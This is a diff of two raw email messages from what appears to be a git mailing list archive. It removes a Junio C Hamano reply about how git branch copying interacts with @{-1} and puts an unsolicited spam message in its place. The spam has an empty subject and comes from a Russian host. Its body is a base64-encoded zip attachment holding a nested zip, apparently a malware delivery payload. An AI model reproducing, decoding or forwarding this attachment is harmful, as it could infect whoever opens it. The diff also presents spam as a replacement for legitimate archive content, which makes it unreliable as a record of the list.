@@ -1,88 +1,90 @@
 Return-Path: <git-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on dcvr.yhbt.net
-X-Spam-Level: 
+X-Spam-Level: *
 X-Spam-ASN: AS31976 209.132.180.0/23
-X-Spam-Status: No, score=-2.9 required=3.0 tests=AWL,BAYES_00,DKIM_SIGNED,
-	HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,RP_MATCHES_RCVD,T_DKIM_INVALID
-	shortcircuit=no autolearn=ham autolearn_force=no version=3.4.0
+X-Spam-Status: No, score=1.4 required=3.0 tests=AWL,BAYES_40,
+	HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,RP_MATCHES_RCVD,ZIPFILE
+	shortcircuit=no autolearn=no autolearn_force=no version=3.4.0
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by dcvr.yhbt.net (Postfix) with ESMTP id 0F95020D0C
-	for <e@80x24.org>; Tue,  6 Jun 2017 00:14:55 +0000 (UTC)
+	by dcvr.yhbt.net (Postfix) with ESMTP id F2C3220D0C
+	for <e@80x24.org>; Tue,  6 Jun 2017 00:17:45 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1751276AbdFFAOw (ORCPT <rfc822;e@80x24.org>);
-        Mon, 5 Jun 2017 20:14:52 -0400
-Received: from mail-pg0-f44.google.com ([74.125.83.44]:34139 "EHLO
-        mail-pg0-f44.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751266AbdFFAOw (ORCPT <rfc822;git@vger.kernel.org>);
-        Mon, 5 Jun 2017 20:14:52 -0400
-Received: by mail-pg0-f44.google.com with SMTP id v18so17563112pgb.1
-        for <git@vger.kernel.org>; Mon, 05 Jun 2017 17:14:51 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=sender:from:to:cc:subject:references:date:in-reply-to:message-id
-         :user-agent:mime-version;
-        bh=mF+Z8Hrru4sqwfm+ZcB07sEjutTRKdiBLSl0q/Iw1bg=;
-        b=oR4FLEElfzjzdoJYk2ZZGj30k01dJVdbrKxHIbaEHiLDyygLwiiXaMdm+9tgcnq4yG
-         YNneGV5ZRcicYb6aYEo6LHAonlMdtXsJ2FUcRM3pcKIkd+V1SP16jYRN58A1xAhzFr7X
-         FUzyYQkII1Go/dL8xRuWM5SBayKFoPER+n2pyv9BSMOHnaSx8ZWcqRUtRsPSVg5gP2HV
-         lBYDBMxNPAh/kUGmcfV+hooBeBgxalveDNJahSsYEaQHGE7PKKY9xq7T7zt1ekMMVcoQ
-         fwfc0umew2FjFMaG3zHONZWSMvhpCe1GrbUus1kVPFc6YPjbp8EWkpb5FtzVd/OjxZVO
-         CWrA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:sender:from:to:cc:subject:references:date
-         :in-reply-to:message-id:user-agent:mime-version;
-        bh=mF+Z8Hrru4sqwfm+ZcB07sEjutTRKdiBLSl0q/Iw1bg=;
-        b=tRbefViLeQ1EEfUoAvQqFOZSqXBl0StVKPhiRy3ZtR1U3Wn5EHjzhV2y3iIqfLoDdR
-         n/eqWgyK3951sGiLvYvCzWi1exhENe322xcS0XubmahRHW1e0RA0IrHfEKPeA0Mw7PV9
-         ErM0JedHTTE2LL+Y2FGOXStAZGqqXfdYIIbtzNxXSaFBcvRcgN9HuMI7p4NVdiBFH2nw
-         BOLcaAqXUqwUfVYvfM6ROTMQn26aVqaEX4Oi9DNy6xRdZ8q5X4d/DgI1KKoBqCsfpt+B
-         5OFpk9AkGaOYygrwSRPCPK38GkO1EOalRORV2Qd9ebs1bd2EkIsSlA0AzhU/D/sW5Mlz
-         wXkA==
-X-Gm-Message-State: AODbwcA18oyXxKZ2uIJs91xgyS437UT89KI/BzWVWaDo+CsZqjaO3oNo
-        00IgGYbLcrH30FgCCDA=
-X-Received: by 10.98.64.93 with SMTP id n90mr22449452pfa.96.1496708091452;
-        Mon, 05 Jun 2017 17:14:51 -0700 (PDT)
-Received: from localhost ([2620:0:1000:8622:5d03:f5d1:882a:10e])
-        by smtp.gmail.com with ESMTPSA id 6sm10200465pfh.57.2017.06.05.17.14.50
-        (version=TLS1_2 cipher=AES128-SHA bits=128/128);
-        Mon, 05 Jun 2017 17:14:50 -0700 (PDT)
-From:   Junio C Hamano <gitster@pobox.com>
-To:     Sahil Dua <sahildua2305@gmail.com>
-Cc:     Git Mailing List <git@vger.kernel.org>
-Subject: Re: [PATCH/RFC v4 3/3] branch: add copy branch feature implementation
-References: <0102015c79fcbda0-2779b4ff-54ad-46f4-bef0-14eeb58338d4-000000@eu-west-1.amazonses.com>
-        <0102015c79fcbe99-7e18cee7-d82d-4ab2-9d6a-ad7376a5ac27-000000@eu-west-1.amazonses.com>
-        <CALiud+=qoSSSg_p2MXZEaVTGMhFW_FtirDJ2-FnmNh+U0yf0Gw@mail.gmail.com>
-        <xmqqlgp69ds9.fsf@gitster.mtv.corp.google.com>
-Date:   Tue, 06 Jun 2017 09:14:49 +0900
-In-Reply-To: <xmqqlgp69ds9.fsf@gitster.mtv.corp.google.com> (Junio C. Hamano's
-        message of "Tue, 06 Jun 2017 09:10:30 +0900")
-Message-ID: <xmqqh8zu9dl2.fsf@gitster.mtv.corp.google.com>
-User-Agent: Gnus/5.13 (Gnus v5.13) Emacs/25.2 (gnu/linux)
+        id S1751243AbdFFARo (ORCPT <rfc822;e@80x24.org>);
+        Mon, 5 Jun 2017 20:17:44 -0400
+Received: from ws59.zone31-163-128.zaural.ru ([31.163.128.59]:35968 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751215AbdFFARn (ORCPT <rfc822;git@vger.kernel.org>);
+        Mon, 5 Jun 2017 20:17:43 -0400
+X-Greylist: delayed 300 seconds by postgrey-1.27 at vger.kernel.org; Mon, 05 Jun 2017 20:17:42 EDT
+Message-ID: <149670825942.12492.11330975510451978276@zaural.ru>
+Content-Transfer-Encoding: base64
+Importance: High
 MIME-Version: 1.0
-Content-Type: text/plain
+From:   <naif@naifco.me>
+Content-Type: application/zip; name="3589301025.zip"
+Content-Disposition: attachment
+Subject: 
+Date:   Tue, 06 Jun 2017 00:17:39 -0000
+To:     <git@vger.kernel.org>
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
 
-Junio C Hamano <gitster@pobox.com> writes:
-
-> When somebody says "I want to rename my current branch to X", it is
-> clear that the person wants to end up being on a branch called X.
->
-> To me, "I want to copy my current branch to Y" sounds more like "I
-> want to create another Y that looks just like the current branch,
-> but I want stay on my current branch".
->
-> If you think copy makes @{-1} problematic, perhaps your copy is
-> doing more than it should (e.g. switching the current branch at the
-> same time, or something).
-
-A related tangent.  Git does not assign any identity to a branch, so
-"the branch we were previously on" goes strictly by name.  If you
-are on branch X, switched to branch Y, and then renamed branch X
-(which is not current) to branch Z, Git will still think that the
-previous branch is X, so an attempt to switch back to @{-1} may do
-unexpected things.
+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
+AAAA
